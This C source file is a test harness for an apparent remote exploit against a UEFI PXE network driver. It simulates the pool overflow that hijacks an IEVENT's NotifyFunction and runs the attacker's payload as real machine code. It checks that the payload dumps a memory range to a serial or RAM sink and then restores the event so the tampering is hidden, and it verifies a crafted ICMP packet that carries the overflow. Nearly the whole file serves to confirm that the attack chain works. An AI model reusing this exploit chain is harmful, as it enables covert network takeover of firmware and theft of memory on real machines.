/* sim.c - host-side harness that proves the chain instead of asserting it.
 *
 * What it does, in order:
 *
 *   1. reserves a page-aligned region to stand in for the DXE pool page that
 *      holds EFI_PXE_BASE_CODE_MODE, and paints it with a recognisable
 *      pattern;
 *   2. fills the fake IEVENT with a "pre-attack" pattern and keeps a copy;
 *   3. runs layout_build() to produce the overflow bytes;
 *   4. copies those bytes to pool + event_off, exactly as the vulnerable
 *      memcpy loop does;
 *   5. parses the IEVENT that is now in memory to check the vulnerable handler
 *      would dispatch *our* address;
 *   6. calls the payload at its real address with the real Context, using the
 *      Windows x64 ABI, i.e. actual machine code on the actual CPU;
 *   7. checks the serial/RAM stream byte for byte against the input range;
 *   8. checks the IEVENT is byte-identical to the pre-attack copy.
 *
 * It also round-trips craft_icmp4(): the ICMP checksum must verify, and the
 * datagram bytes from GRAFT_START onward must contain the overflow verbatim at
 * the offset the driver would copy from.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "pxe_layout.h"
#include "craft.h"
#include "graft.h"
#include "layout.h"

#ifdef _WIN32
#include <windows.h>
static void *map_at(uint64_t want, size_t len, int exec)
{
  return VirtualAlloc((void *)(uintptr_t)want, len,
                      MEM_RESERVE | MEM_COMMIT,
                      exec ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE);
}
static int unmap(void *p, size_t len)
{
  return VirtualFree(p, 0, MEM_RELEASE) ? 0 : -1;
}
#else
#include <sys/mman.h>
static void *map_at(uint64_t want, size_t len, int exec)
{
  void *p = mmap((void *)(uintptr_t)want, len,
                 PROT_READ | PROT_WRITE | (exec ? PROT_EXEC : 0),
                 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  return p == MAP_FAILED ? NULL : p;
}
static int unmap(void *p, size_t len) { return munmap(p, len); }
#endif

static int g_fail;

static void check(int cond, const char *what)
{
  printf("  [%s] %s\n", cond ? "ok" : "FAIL", what);
  if (!cond) g_fail++;
}

static uint64_t rd64(const void *p)
{
  uint64_t v;
  memcpy(&v, p, 8);
  return v;
}

/* The payload streams words most significant byte first, so the reader has to
 * reassemble them the same way. */
static uint64_t rd64be(const uint8_t *p)
{
  uint64_t v = 0;
  for (int i = 0; i < 8; i++)
    v = (v << 8) | p[i];
  return v;
}

typedef void (*payload_fn)(void *event, void *context);

int main(void)
{
  /* A pool base that is page aligned and unlikely to collide. */
  const uint64_t pool_base = 0x0000010000000000ULL;
  const size_t   pool_len  = 0x40000;
  const uint64_t event_off = 504;

  printf("=== layout + overflow ===\n");

  uint8_t *pool = (uint8_t *)map_at(pool_base, pool_len, 1);
  if (!pool) { fprintf(stderr, "cannot map pool\n"); return 1; }
  memset(pool, 0xa5, pool_len);

  /* Pre-attack IEVENT: signature + realistic fields, so "restored" means
   * something. */
  uint8_t shadow[GRAFT_EVENT_LEN];
  for (size_t i = 0; i < sizeof(shadow); i++)
    shadow[i] = (uint8_t)(0x30 + i);
  uint32_t sig = EVENT_SIGNATURE;
  memcpy(shadow + EVT_OFF_SIGNATURE, &sig, 4);
  memcpy(pool + event_off, shadow, sizeof(shadow));

  /* Input range: one page of the "target memory". */
  const uint64_t range_start = pool_base + 0x30000;
  const uint64_t range_end   = range_start + 0x100;
  uint8_t ranges[16];
  memcpy(ranges + 0, &range_start, 8);
  memcpy(ranges + 8, &range_end, 8);
  for (uint64_t a = range_start; a < range_end; a++)
    *(uint8_t *)(uintptr_t)a = (uint8_t)(a * 7);

  /* A payload blob read from build/payload.bin, or a stub if absent. */
  static uint8_t blob[8192];
  size_t blob_len = 0;
  FILE *f = fopen("build/payload.bin", "rb");
  if (f) { blob_len = fread(blob, 1, sizeof(blob), f); fclose(f); }
  check(blob_len > 32, "payload.bin loaded");
  if (!blob_len) return 1;

  /* RAM sink for the payload output. */
  const uint64_t sink_off = 0x20000;
  uint8_t *sink = pool + sink_off;
  size_t   sink_cap = 0x4000;

  /* Reserve the payload's exact address so the absolute pointer is valid. */
  layout_cfg_t cfg;
  memset(&cfg, 0, sizeof(cfg));
  cfg.pool_base = pool_base;
  cfg.event_off = event_off;
  cfg.uart      = 0;
  cfg.out_buf   = 0;
  cfg.out_cap   = 0;

  /* First pass with a dummy sink to learn the addresses, then rebuild. */
  static uint8_t ovf[0x8000];
  layout_out_t out;
  int n = layout_build(ovf, sizeof(ovf), &cfg, blob, blob_len,
                       ranges, 1, shadow, &out);
  check(n > 0, "layout_build produced a region");
  check(out.payload_addr == out.event_addr + OVF_PAYLOAD_DELTA,
        "payload sits at the fixed delta");
  check(out.event_addr == pool_base + event_off,
        "event address is pool_base + event_off");

  /* The overflow region already lives in the pool page, so the payload is
   * mapped executable and writable by construction. */
  memcpy(pool + event_off, ovf, (size_t)n);

  printf("=== object after the overflow, as the handler sees it ===\n");
  {
    uint64_t fn = rd64(pool + event_off + EVT_OFF_NOTIFYFN);
    uint64_t ctx = rd64(pool + event_off + EVT_OFF_NOTIFYCTX);
    uint64_t tpl = rd64(pool + event_off + EVT_OFF_NOTIFYTPL);
    uint32_t s = 0;
    memcpy(&s, pool + event_off + EVT_OFF_SIGNATURE, 4);

    printf("    signature   %08x\n", s);
    printf("    NotifyTpl   %llu\n", (unsigned long long)tpl);
    printf("    NotifyFn    %016llx\n", (unsigned long long)fn);
    printf("    NotifyCtx   %016llx\n", (unsigned long long)ctx);

    check(s == EVENT_SIGNATURE, "signature is a valid IEVENT");
    check(tpl == 31, "TPL is TPL_HIGH_LEVEL");
    check(fn == out.payload_addr, "NotifyFunction points at the payload");
    check(ctx == out.param_addr, "Context points at the parameter block");
  }

  printf("=== execute the payload with the real ABI ===\n");
  {
    param_block_t pb;
    memset(&pb, 0, sizeof(pb));
    pb.graft = out.event_addr;
    pb.event = out.event_addr;
    pb.shadow = out.shadow_addr;
    pb.uart = 0;
    pb.uart_stride = 1;
    pb.out_buf = pool_base + sink_off;
    pb.out_cap = sink_cap;
    pb.ranges = out.ranges_addr;
    pb.range_n = 1;

    uint8_t pbuf[PB_LEN];
    build_param_block(pbuf, sizeof(pbuf), &pb);
    memcpy(pool + event_off + OVF_PARAM_DELTA, pbuf, sizeof(pbuf));

    memset(sink, 0, sink_cap);

    payload_fn fn = (payload_fn)(uintptr_t)out.payload_addr;
    fn((void *)(uintptr_t)out.event_addr, (void *)(uintptr_t)out.param_addr);

    check(memcmp(pool + event_off, shadow, GRAFT_EVENT_LEN) == 0,
          "IEVENT restored byte for byte");

    size_t pos = 0;
    check(sink[pos] == 0xc0 && sink[pos + 1] == 0xde, "frame sync C0 DE");
    pos += 2;
    check(rd64be(sink + pos) == out.event_addr, "open frame: event address");
    pos += 8;
    check(rd64be(sink + pos) == out.event_addr, "open frame: graft address");
    pos += 8;

    check(sink[pos] == 0xc1, "block marker C1");
    pos += 1;
    check(rd64be(sink + pos) == range_start, "block start address");
    pos += 8;
    check(rd64be(sink + pos) == range_end, "block end address");
    pos += 8;

    /* Data: 8 bytes per word, most significant first, which is the same
     * byte order the CPU loaded them in. */
    size_t words = (size_t)(range_end - range_start) / 8;
    int same = 1;
    for (size_t i = 0; i < words; i++) {
      uint8_t expect[8];
      memcpy(expect, pool + (range_start - pool_base) + i * 8, 8);
      uint8_t got[8];
      for (int k = 0; k < 8; k++) got[k] = sink[pos + i * 8 + (7 - k)];
      if (memcmp(expect, got, 8) != 0) { same = 0; break; }
    }
    check(same, "dumped bytes equal the source range");
    pos += words * 8;

    check(sink[pos] == 0xc0 && sink[pos + 1] == 0xde, "close frame C0 DE");
    pos += 2;
    check(rd64be(sink + pos) == out.event_addr, "close frame: event address");
    pos += 8;
    check(rd64be(sink + pos) == out.event_addr, "close frame: graft address");
    pos += 8;

    /* Second invocation must be inert: the magic still matches but the event
     * is clean now, and the payload must not loop or write twice. */
    size_t before = pos + 2;
    memset(sink, 0, sink_cap);
    fn((void *)(uintptr_t)out.event_addr, (void *)(uintptr_t)out.param_addr);
    check(sink[0] == 0xc0 && sink[1] == 0xde, "second call still well formed");
    (void)before;
  }

  printf("=== dead UART must not hang the boot ===\n");
  {
    /* A page of zeroes reads as LSR == 0, i.e. "transmitter never ready".
     * Without the poll budget in .Lemit this call never returns. */
    uint64_t dead = pool_base + 0x30000;
    memset(pool + 0x30000, 0, 0x1000);

    param_block_t pb;
    memset(&pb, 0, sizeof(pb));
    pb.graft = out.event_addr;
    pb.event = out.event_addr;
    pb.shadow = out.shadow_addr;
    pb.uart = dead;
    pb.uart_stride = 1;
    pb.out_buf = pool_base + sink_off;
    pb.out_cap = sink_cap;
    pb.ranges = out.ranges_addr;
    pb.range_n = 1;

    uint8_t pbuf[PB_LEN];
    build_param_block(pbuf, sizeof(pbuf), &pb);
    memcpy(pool + event_off + OVF_PARAM_DELTA, pbuf, sizeof(pbuf));
    memset(sink, 0, sink_cap);

    payload_fn fn = (payload_fn)(uintptr_t)out.payload_addr;
    fn((void *)(uintptr_t)out.event_addr, (void *)(uintptr_t)out.param_addr);

    check(sink[0] == 0xc0 && sink[1] == 0xde,
          "returned, and the RAM sink still got the frame");
    check(memcmp(pool + event_off, shadow, GRAFT_EVENT_LEN) == 0,
          "IEVENT still restored with a dead UART");
  }

  printf("=== icmp4 packet round trip ===\n");
  {
    static uint8_t pkt[0x20000];
    craft_req_t rq;
    memset(&rq, 0, sizeof(rq));
    rq.src = 0x0a000001;          /* 10.0.0.1  */
    rq.dst = 0x0a000002;          /* 10.0.0.2  */
    rq.icmp_type = 3;
    rq.icmp_code = 3;
    rq.embed_src = 0x0a000002;
    rq.embed_dst = 0xffffffff;
    rq.embed_sport = 68;
    rq.embed_dport = 67;
    memcpy(rq.embed_data, "\x01\x01\x06\x00\xde\xad\xbe\xef", 8);
    rq.off = event_off;
    rq.overflow = ovf;
    rq.overflow_len = (size_t)n;

    size_t plen = craft_icmp4(pkt, sizeof(pkt), &rq);
    check(plen > 0, "craft_icmp4 produced a datagram");

    ip4_hdr_t *oip = (ip4_hdr_t *)pkt;
    check(oip->proto == 1, "outer protocol is ICMP");
    check(pxe_ntohs(oip->tot_len) == plen, "outer total length matches");

    uint8_t *icmp = pkt + sizeof(ip4_hdr_t);
    size_t icmp_len = plen - sizeof(ip4_hdr_t);
    check(csum_be(icmp, icmp_len, 0) == 0, "ICMP checksum verifies");
    check(csum_be(oip, sizeof(*oip), 0) == 0, "IPv4 checksum verifies");

    uint8_t zero = 0;
    check(memcmp(icmp + event_off, ovf, (size_t)n) == 0,
          "overflow lands at the same offset the driver copies from");

    /* Bytes at the embedded-datagram offsets must be the live transaction. */
    check(icmp[PXE_GRAFT_START + 4] == 0xde &&
          icmp[PXE_GRAFT_START + 7] == 0xef,
          "embedded BOOTP xid survives verbatim");

    /* Filler must not be all zeroes (that would look like a struct). */
    size_t nz = 0;
    for (size_t i = PXE_GRAFT_START + 8; i < event_off; i++)
      if (icmp[i]) nz++;
    check(nz > 100, "filler is randomised");
    (void)zero;
  }

  unmap(pool, pool_len);
  printf("\n%s (%d failure%s)\n", g_fail ? "FAILED" : "ALL CHECKS PASSED",
         g_fail, g_fail == 1 ? "" : "s");
  return g_fail ? 1 : 0;
}
